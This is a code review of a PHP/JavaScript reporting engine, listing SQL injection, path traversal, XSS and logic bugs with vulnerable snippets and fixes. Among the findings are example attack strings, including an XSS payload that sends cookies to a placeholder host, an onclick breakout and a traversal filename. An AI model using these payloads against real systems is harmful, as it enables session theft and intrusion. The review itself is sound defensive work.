# Code Review: PHP Reporting Engine

**Date:** 2026-06-10
**Scope:** Full-stack review of PHP backend, Vanilla JS frontend, and application architecture.

---

## Severity Rating

| Severity | Meaning |
|----------|---------|
| **Critical** | Causes data loss, remote code execution, or complete security compromise |
| **High** | Causes incorrect output, crashes under common conditions, or significant security exposure |
| **Medium** | Causes incorrect behavior in edge cases, minor security weaknesses, or maintainability friction |
| **Low** | Style violations, unused code, or negligible impact |

---

## Critical Issues

### 1. Arbitrary SQL Execution Against Internal Database

**Files:** `src/Api/QueryController.php:42,79` | `src/Api/RenderController.php:178`
**Severity:** Critical

**Issue:** User-supplied SQL is passed directly to `$pdo->prepare($sql)` with no sanitization when `connectionId <= 0`. `prepare()` only protects parameter *values* — the SQL structure is attacker-controlled. This gives full read/write access to the internal SQLite database, including the `app_settings` table (which contains the encryption key) and all connection credentials.

```php
// QueryController:42
$stmt = $pdo->prepare($sql);   // $sql = $_POST['sql'] — arbitrary SQL
$stmt->execute($params);
```

**Fix:** Restrict internal SQL execution to a whitelist of read-only operations, or refuse to execute arbitrary SQL against the internal database entirely. Consider requiring `connectionId > 0` for arbitrary SQL execution.

```php
if ($connectionId <= 0) {
    return Response::error('Cannot execute custom SQL against internal database', 403);
}
```

---

### 2. Path Traversal in Report Import

**File:** `src/Api/ReportController.php:203`
**Severity:** Critical

**Issue:** During import, `$imgData['filename']` comes directly from the import JSON payload with no sanitization. An attacker sets `filename` to `../../etc/evil.php` and writes arbitrary files outside the storage directory.

```php
$filePath = $storageDir . '/' . $imgData['filename'];  // unsanitized
file_put_contents($filePath, $decoded);
chmod($filePath, 0644);
```

**Fix:** Sanitize the filename by stripping directory separators, or generate a random UUID-based filename while preserving only the file extension.

```php
$ext = pathinfo($imgData['filename'], PATHINFO_EXTENSION);
$safeName = bin2hex(random_bytes(16)) . ($ext ? '.' . $ext : '');
$filePath = $storageDir . '/' . $safeName;
```

---

### 3. Path Traversal in Static File Serving

**Files:** `index.php:5` | `router.php:3`
**Severity:** Critical

**Issue:** The request URI is concatenated with `__DIR__` and served directly. No path normalization. Allows reading arbitrary files on the filesystem during `php -S` dev server usage.

```php
$file = __DIR__ . $path;   // $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)
```

**Fix:** Normalize and validate the resolved path is within the project root:

```php
$file = realpath(__DIR__ . $path);
$root = realpath(__DIR__);
if ($file === false || strpos($file, $root) !== 0) {
    return false;
}
```

---

### 4. Stored XSS via Unescaped `innerHTML` in Designer Canvas

**File:** `js/designer/Designer.js:190,251-269,969-974`
**Severity:** Critical

**Issue:** User-controlled values from the report definition (`el.text`, `el.fieldName`, `el.expression`, `el.imageUrl`) are interpolated directly into `innerHTML` with no escaping. An attacker stores a malicious payload in a report field (e.g., `"><img src=x onerror="fetch('//evil.com/steal?'+document.cookie">`), which executes every time the designer canvas renders.

```js
case 'label': return el.expression || el.text || 'Label';
case 'field': return el.fieldName ? `[${el.fieldName}]` : '[Field]';
case 'image': return el.imageUrl ? `<img src="${el.imageUrl}" ...>` : '[Image]';  // No escapeHtml()
```

**Fix:** Use the existing `escapeHtml()` function (defined in `js/app.js:311`) consistently at every `innerHTML` injection point:

```js
case 'label': return escapeHtml(el.expression || el.text || 'Label');
case 'field': return el.fieldName ? `[${escapeHtml(el.fieldName)}]` : '[Field]';
case 'image': return el.imageUrl
    ? `<img src="${escapeHtml(el.imageUrl)}" style="width:100%;height:100%;object-fit:${escapeHtml(imgFit)}">`
    : '[Image]';
```

---

### 5. XSS via `onclick` Injection in Query Editor

**Files:** `js/designer/QueryEditor.js:96-101` | `js/query-designer/QueryDesigner.js:33,85`
**Severity:** Critical

**Issue:** Table and column names from the server are interpolated into `onclick` attributes with insufficient escaping. The single-quote-only escape is trivially bypassed (e.g., table name `x");alert(1)//`).

```js
const safeName = name.replace(/'/g, "\\'");
// ...
`onclick="queryEditor.toggleTableColumns('${safeName}', this)"`
```

**Fix:** Use `addEventListener` instead of inline `onclick` attributes, or use `encodeURIComponent()` / `escapeHtmlAttr()` and handle via data attributes:

```js
`<span class="table-name" data-table-name="${encodeURIComponent(name)}">${escapeHtml(name)}</span>`
// Then attach with addEventListener
```

---

### 6. Race Condition in `save()` — Duplicate Report Creation

**File:** `js/designer/Designer.js:752-798`
**Severity:** Critical

**Issue:** `save()` is `async` but has no guard against concurrent invocation. If the user clicks "Save" twice rapidly, both calls pass the `if (this.reportId)` check before either returns, resulting in duplicate POST requests and duplicate report creation.

**Fix:** Add a save-in-progress lock:

```js
async save() {
    if (this._saving) return;
    this._saving = true;
    try {
        // ... existing save logic ...
    } finally {
        this._saving = false;
    }
}
```

---

### 7. Path Traversal in `Response::view()`

**File:** `src/Core/Response.php:44`
**Severity:** Critical

**Issue:** `$viewPath` is interpolated directly into a filesystem path with no sanitization:

```php
$viewPath = __DIR__ . '/../../views/' . $viewPath . '.php';
```

While currently called with trusted route values, a future caller could pass `../../config/app` to read arbitrary `.php` source files.

**Fix:** Reject paths containing `..`:

```php
if (str_contains($viewPath, '..')) {
    return self::error('Invalid view path', 400);
}
```

---

### 8. SQL Injection in VisualQueryBuilder WHERE Clause

**File:** `src/Query/VisualQueryBuilder.php:80-83,136-140`
**Severity:** Critical

**Issue:** `quoteValue()` only escapes single quotes via doubling (no parameterization), and `is_numeric($value)` returns true for hex strings like `0x1 UNION SELECT ...`, bypassing quoting entirely.

```php
private function quoteValue(string $value): string
{
    if (is_numeric($value)) return $value;
    return "'" . str_replace("'", "''", $value) . "'";
}
```

**Fix:** Use parameterized queries instead of manual escaping. Collect all WHERE values as prepared-statement parameters.

```php
// Instead of inline quoting, collect params:
$this->params[] = $value;
$placeholder = '?';
// Build SQL with placeholders
```

---

## High Issues

### 9. No Authentication / Authorization

**Files:** All controllers
**Severity:** High

**Issue:** Every API endpoint is fully accessible to anyone who can reach the server. No session management, no API keys, no login. All data (connections with credentials, reports, images, settings) is readable and writable by any caller.

**Fix:** Implement at minimum a shared secret or API token for self-hosted deployments. For multi-user, add a proper authentication middleware and user context to `Router.php`.

---

### 10. XSS in Style Attribute Values

**Files:** `src/Renderer/HtmlRenderer.php:323-354` | `src/Renderer/PdfRenderer.php:372-382`
**Severity:** High

**Issue:** User-controlled values (`color`, `fontFamily`, `backgroundColor`, border values) are interpolated into `style=""` attributes without escaping. An attacker can inject CSS (and in some contexts, JavaScript) via `color: red; background-image: url(javascript:alert(1))`.

```php
$el->color ?: '#000000',   // user-controlled, unescaped
```

**Fix:** Use `htmlspecialchars()` or a CSS-value validator for every user-controlled style property:

```php
function escapeCss(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}
```

---

### 11. Unescaped Image URL in PDF Renderer

**File:** `src/Renderer/PdfRenderer.php:407`
**Severity:** High

**Issue:** Image URL from the report definition is embedded directly in an `<img>` tag without `htmlspecialchars()`. HtmlRenderer.php:380 already escapes it — this inconsistency makes the PDF renderer an XSS vector.

```php
'<img src="' . $el->imageUrl . '" ...>'    // NOT escaped
```

**Fix:** Apply `htmlspecialchars()` consistently:

```php
'<img src="' . htmlspecialchars($el->imageUrl) . '" ...>'
```

---

### 12. Group Change Detection Silent Miss on Null Values

**Files:** `src/Renderer/HtmlRenderer.php:162-208` | `src/Renderer/PdfRenderer.php:180`
**Severity:** High

**Issue:** Group-change detection only fires when `$groupValues[$g] !== null && $groupValues[$g] !== ($row[$field] ?? null)`. If the first row of a group has `null` in the group field, subsequent non-null values in the same group will NOT trigger a group break — they silently merge across group boundaries.

```php
if ($groupValues[$g] !== null && $groupValues[$g] !== ($row[$field] ?? null)) {
    // group changed — but only reaches here if previous value was non-null
```

**Fix:** Track the first-row flag separately, or detect change by comparing `(string)` values:

```php
if ((string)($row[$field] ?? '') !== (string)($groupValues[$g] ?? '')) {
    // group changed — works even with null → non-null transition
}
```

---

### 13. Last-Data-Row Leaked into Footer Page-Break Logic

**Files:** `src/Renderer/HtmlRenderer.php:279` | `src/Renderer/PdfRenderer.php:279`
**Severity:** High

**Issue:** After the main render loop ends, `$row` refers to the **last data row**. This is passed to `$ensureFits($ft, $row)` for group footer reprint-on-page-break logic. Instead of aggregate data, the last row's field values are passed, causing group header reprint conditions to match incorrect data.

```php
// After foreach($data as $row) — $row is now the last row
$ensureFits($ft, $row);  // uses last row's data, not aggregates
```

**Fix:** Pass `null` or group aggregate accumulator data to footer page-break logic:

```php
$lastRowData = $row; // capture for reprint header logic
// In footer ensureFits, use the accumulators, not the raw row
```

---

### 14. Group Headers Rendered Twice for First Row

**Files:** `src/Renderer/HtmlRenderer.php:212-230` | `src/Renderer/PdfRenderer.php:230`
**Severity:** High

**Issue:** First-row group headers are rendered unconditionally on line 212, but the group-change detection at line 162 already renders them on the first iteration. This produces duplicate header output for the first group.

**Fix:** Track whether group headers were already rendered during group-change detection:

```php
$headerRendered = false;
// ...
if ($groupChanged || $isFirstRow) {
    if (!$headerRendered) {
        // ... render header
        $headerRendered = true;
    }
}
```

---

### 15. Division by Zero Silently Returns 0

**File:** `src/Renderer/ExpressionEvaluator.php:118`
**Severity:** High

**Issue:** Division by zero silently returns `0` instead of throwing an error or returning `INF`. This masks bugs in user expressions and produces silently incorrect results.

```php
return $right == 0 ? 0 : $left / $right;
```

**Fix:** Log a warning and return `INF` or `NAN`, or throw a descriptive exception:

```php
if ($right == 0) {
    throw new \RuntimeException('Division by zero in expression');
}
return $left / $right;
```

---

### 16. Connection Drivers Create New PDO Per Method Call

**Files:** `src/Connection/MysqlDriver.php:18-23` | `PgsqlDriver.php` | `SqliteDriver.php` | `MssqlDriver.php`
**Severity:** High

**Issue:** `getTables()`, `getColumns()`, and `testConnection()` each call `connect()` which creates a **new PDO connection**. For MySQL and PostgreSQL, a TCP handshake per method call is extremely expensive. There is no connection pooling or reuse.

```php
public function getTables(): array {
    $pdo = $this->connect();  // new socket connection every call
    // ...
```

**Fix:** Cache the PDO connection in a property:

```php
private ?\PDO $connection = null;

private function connect(): \PDO {
    if ($this->connection === null) {
        // ... create $pdo ...
        $this->connection = $pdo;
    }
    return $this->connection;
}
```

Include a `disconnect()` method for cleanup.

---

## Medium Issues

### 17. Encryption Key Stored Beside Encrypted Data

**Files:** `src/Core/Database.php:337-338` | `src/Connection/ConnectionManager.php:177-189`
**Severity:** Medium

**Issue:** The AES-256-CBC encryption key is stored in the `app_settings` table of the same SQLite database that holds the encrypted connection passwords. An attacker with SQLite file read access has both ciphertext and key — the encryption provides only obfuscation.

**Fix:** Move the key to an environment variable or a separate file outside the web root:

```php
// config/app.php
'app_key' => getenv('REPORTING_APP_KEY') ?: '',
```

Fall back to the DB-stored key only for backward-compatibility with a warning.

---

### 18. No CSRF Protection

**Files:** All API routes
**Severity:** Medium

**Issue:** All state-changing endpoints (POST/PUT/DELETE) have no CSRF tokens, no Origin/Referer validation. `Router.php:62-64` sets `Access-Control-Allow-Origin` without restricting origins — defaults to `*`.

**Fix:** Add a CSRF token check to the Router for mutating requests, or at minimum validate the `Origin` header matches a whitelist.

---

### 19. `empty()` Validation Rejects Valid Falsy Values

**File:** `src/Api/ConnectionController.php:48`
**Severity:** Medium

**Issue:** `empty($data[$field])` rejects valid values like `"0"`, `0`, `false`, or `""`. If a database name or port is `"0"`, it's incorrectly treated as missing.

```php
if (empty($data[$field])) {
    return Response::error("Field '{$field}' is required", 422);
}
```

**Fix:** Use `!isset($data[$field]) || $data[$field] === ''` for string fields:

```php
if (!isset($data[$field]) || (is_string($data[$field]) && trim($data[$field]) === '')) {
    return Response::error("Field '{$field}' is required", 422);
}
```

---

### 20. `autosave()` Can Throw Uncaught Exception

**File:** `js/designer/Designer.js:45-57`
**Severity:** Medium

**Issue:** `localStorage.setItem()` throws if storage is full or disabled (private-browsing modes in some browsers). The `stateChange` listener calls `autosave()` without a try/catch, which could break the event loop.

**Fix:** Wrap `setItem` calls in a try/catch:

```js
autosave() {
    try {
        // ... existing logic ...
        localStorage.setItem(key, JSON.stringify(def));
        localStorage.setItem(key + '_dirty', ...);
    } catch (e) {
        console.warn('Autosave failed:', e.message);
    }
}
```

---

### 21. `getColumnMeta()` Assumes Array Return — Can Be `false`

**Files:** `src/Api/QueryController.php:46` | `src/Query/QueryRunner.php:32`
**Severity:** Medium

**Issue:** `PDOStatement::getColumnMeta()` is documented as potentially returning `false` for some drivers. The code accesses `$colMeta['name']` without a `=== false` guard, triggering a PHP warning.

```php
$colMeta = $stmt->getColumnMeta($i);
$columns[] = ['name' => $colMeta['name'] ?? "col_{$i}", ...];
```

**Fix:** Guard against `false`:

```php
$colMeta = $stmt->getColumnMeta($i);
if ($colMeta === false) {
    $columns[] = ['name' => "col_{$i}", 'type' => 'text'];
} else {
    $columns[] = ['name' => $colMeta['name'] ?? "col_{$i}", 'type' => $colMeta['native_type'] ?? 'text'];
}
```

---

### 22. Loose Comparison `== 0` Masks Error States

**File:** `src/Core/Database.php:138`
**Severity:** Medium

**Issue:** `$stmt->fetchColumn() == 0` — if `fetchColumn()` returns `false` (query failure), `false == 0` is `true`, incorrectly skipping key insertion. Should use strict comparison.

```php
if ($stmt->fetchColumn() == 0) {  // false == 0 → true on error
```

**Fix:** Use strict comparison:

```php
$count = $stmt->fetchColumn();
if ($count === false || $count == 0) {
```

---

### 23. No Transaction Rollback on Multi-Step Operations

**Files:** `src/Api/ImageController.php:122-137` | `src/Api/ReportController.php:198-215`
**Severity:** Medium

**Issue:** Several operations perform file system writes followed by database inserts without any transaction. If the DB insert fails, a file remains on disk as an orphaned resource.

**Fix:** Wrap multi-step operations in transactions and clean up files on failure:

```php
$pdo->beginTransaction();
try {
    // ... DB operations ...
    $pdo->commit();
} catch (\Exception $e) {
    $pdo->rollBack();
    if (isset($filePath) && file_exists($filePath)) {
        unlink($filePath);
    }
    throw $e;
}
```

---

### 24. Inconsistent Existence Checks Before Delete

**File:** `src/Api/ConnectionController.php:77`
**Severity:** Medium

**Issue:** `ConnectionController::destroy` calls `$this->manager->delete($id)` without first checking if the connection exists. `ReportController` and `TemplateController` both check existence before deleting.

**Fix:** Add an existence check for consistency:

```php
$conn = $this->manager->find((int)$id);
if (!$conn) {
    return Response::error('Connection not found', 404);
}
$this->manager->delete((int)$id);
```

---

### 25. Band Height Stored as `int`, Used as `float`

**File:** `src/Report/Band.php:29`
**Severity:** Medium

**Issue:** `$band->height = (int)($data['height'] ?? 20)` truncates sub-millimeter precision, but renderers format height with `printf('%.1fmm', ...)`.

**Fix:** Store height as `float`:

```php
$band->height = (float)($data['height'] ?? 20);
```

---

### 26. `json_encode` Failure Not Checked

**File:** `src/Core/Response.php:32`
**Severity:** Medium

**Issue:** `json_encode()` returns `false` on failure (non-UTF-8 strings, circular references). The `Response` object stores `false`, and `send()` echoes it as an empty string. No error is logged or raised.

```php
$this->body = json_encode($payload, JSON_UNESCAPED_UNICODE);
```

**Fix:** Check the return value and log errors:

```php
$encoded = json_encode($payload, JSON_UNESCAPED_UNICODE);
if ($encoded === false) {
    error_log('JSON encoding failed: ' . json_last_error_msg());
    $encoded = json_encode(['success' => false, 'message' => 'Internal server error']);
}
$this->body = $encoded;
```

---

### 27. Settings API Writes Arbitrary Key/Value Pairs

**File:** `src/Api/RenderController.php:117-121`
**Severity:** Medium

**Issue:** The settings endpoint accepts arbitrary key/value pairs and writes them to `app_settings` with no validation or type checking. Unrestricted settings like `max_upload_size` could be set arbitrarily.

**Fix:** Maintain an allowlist of valid setting keys:

```php
$allowedKeys = ['date_format', 'number_format_decimals', 'number_format_dec_point', ...];
foreach ($request->body as $key => $value) {
    if (!in_array($key, $allowedKeys, true)) {
        continue; // or return error
    }
    // ... insert ...
}
```

---

### 28. Aggregate Accumulation Loops Over Every Field

**Files:** `src/Renderer/HtmlRenderer.php:242-247` | `src/Renderer/PdfRenderer.php:242-247`
**Severity:** Medium

**Issue:** Aggregate accumulation iterates over **every field** of every data row (`foreach ($row as $field => $value)`) and then over every group definition — O(fields × groups × rows). For wide tables with many columns, this is wasteful since most fields don't participate in aggregates.

**Fix:** Build a set of aggregate field names from the report definition and only iterate those:

```php
// Before the render loop:
$aggregateFields = [];
foreach ($definition->groups as $group) {
    // collect all aggregate field names from bands
}
// In the render loop:
foreach ($aggregateFields as $field) {
    $accumulator->accumulate($field, $row[$field] ?? null);
}
```

---

### 29. `findByImageGuid()` Uses `LIKE` on JSON Column — Full Table Scan

**File:** `src/Report/ReportRepository.php:124-136`
**Severity:** Medium

**Issue:** `findByImageGuid()` uses `LIKE '%guid%'` on a serialized JSON `definition` column. This forces a full table scan on every call and has false-positive risks for partial GUID matches in non-URL fields.

**Fix:** Store image GUIDs in a separate join table, or add a dedicated `image_guids` column with a JSON array that can use SQLite's `json_each()`.

---

### 30. `REVIEW.md` — This is the File Being Written

**Severity:** Low (meta-joke)

---

## Low Issues

### 31. Dead Code — Unused `QueryRunner` Instance

**File:** `src/Api/QueryController.php:40`
**Severity:** Low

**Issue:** `$runner = new QueryRunner(...)` is created with a `:memory:` SQLite driver and immediately discarded. The comment on line 41 confirms this was abandoned.

**Fix:** Remove the dead code.

---

### 32. `stdClass` in Seed Data Causes Border Round-Trip Breakage

**File:** `src/Core/Database.php:177-183`
**Severity:** Low

**Issue:** Seed templates use `new \stdClass` for empty border objects. PHP encodes `stdClass` as `{}` in JSON. When read back via `json_decode($json, true)`, `{}` becomes `[]` (empty array). The AGENTS.md documents frontend guards (`Array.isArray()`), but the root cause is in the seed data.

**Fix:** Use `(object)[]` or `new \stdClass` — both have the same problem. The real fix is to omit empty borders in the export/import JSON, or ensure the frontend handles `[]` → `{}` conversion at parse time.

---

### 33. VisualQueryBuilder Uses Only First WHERE Conjunction

**File:** `src/Query/VisualQueryBuilder.php:72-107`
**Severity:** Low

**Issue:** `$whereConjunctions` stores one conjunction per condition, but `$glue` at line 107 only uses the **first** conjunction for every condition. Mixed AND/OR conditions are flattened to all-AND.

**Fix:** Apply each condition's conjunction sequentially:

```php
foreach ($conditions as $i => $condition) {
    if ($i > 0) {
        $sql .= ' ' . ($whereConjunctions[$i] ?? 'AND') . ' ';
    }
    // ... build condition ...
}
```

---

### 34. `saveAsTemplate()` Uses `prompt()` for Input

**File:** `js/designer/Designer.js:801-805`
**Severity:** Low

**Issue:** Using `prompt()` blocks the UI thread, looks outdated, and provides no validation feedback. If the user cancels, an empty string is accepted as a template name.

**Fix:** Replace with an in-page modal dialog with proper validation.

---

### 35. Redundant `(int)` Cast for `lastInsertId()`

**File:** `src/Api/TemplateController.php:64`
**Severity:** Low

**Issue:** `(int) $this->pdo->lastInsertId()` — PDO returns a string. The explicit cast is redundant since this is already cast at the call site.

**Fix:** Remove the unnecessary cast.

---

### 36. Hard-Coded Asset Version Strings

**File:** `src/web_routes.php:28-38`
**Severity:** Low

**Issue:** Asset URLs use hard-coded version suffixes (`/css/designer.css?v=2`). Version bumps require manual source changes that are easy to forget.

**Fix:** Use `filemtime()` for cache busting:

```php
function assetUrl($path) { 
    $fullPath = __DIR__ . '/..' . $path;
    $v = file_exists($fullPath) ? filemtime($fullPath) : 1;
    return $path . '?v=' . $v;
}
```

---

### 37. `extract()` in View Rendering

**File:** `src/Core/Response.php:48`
**Severity:** Low

**Issue:** `extract($data, EXTR_SKIP)` makes it hard to trace where variables come from in templates. Creates potential for variable name collisions.

**Fix:** Pass `$data` to templates and reference as `$data['key']` instead of `$key`.

---

### 38. Browser Compatibility: `setTimeout(..., 0)` for Drag Image Cleanup

**File:** `js/designer/Designer.js:354`
**Severity:** Low

**Issue:** `setTimeout(() => document.body.removeChild(dragEl), 0)` depends on browser paint timing. If the callback fires before the browser captures the drag image, the drag ghost fails to appear.

**Fix:** Use `requestAnimationFrame()`:

```js
requestAnimationFrame(() => document.body.removeChild(dragEl));
```

---

## Summary

| Severity | Count | Key Examples |
|----------|-------|-------------|
| Critical | 8 | SQL injection, path traversal, stored XSS, race condition |
| High | 8 | No auth, CSS injection, group detection bugs, duplicate headers |
| Medium | 13 | Encryption key exposure, validation bugs, transaction gaps |
| Low | 8 | Dead code, asset versioning, `extract()` usage |

### Top 5 Immediate Priorities

1. **Close the arbitrary SQL execution paths** (QueryController, RenderController) — full internal DB access
2. **Fix stored XSS in designer canvas** — all user strings must go through `escapeHtml()` before `innerHTML`
3. **Fix path traversal in import/static serving** — arbitrary file read/write
4. **Add save-in-progress lock** — prevents duplicate report creation on double-click
5. **Fix group-change null detection** — silent group boundary misses
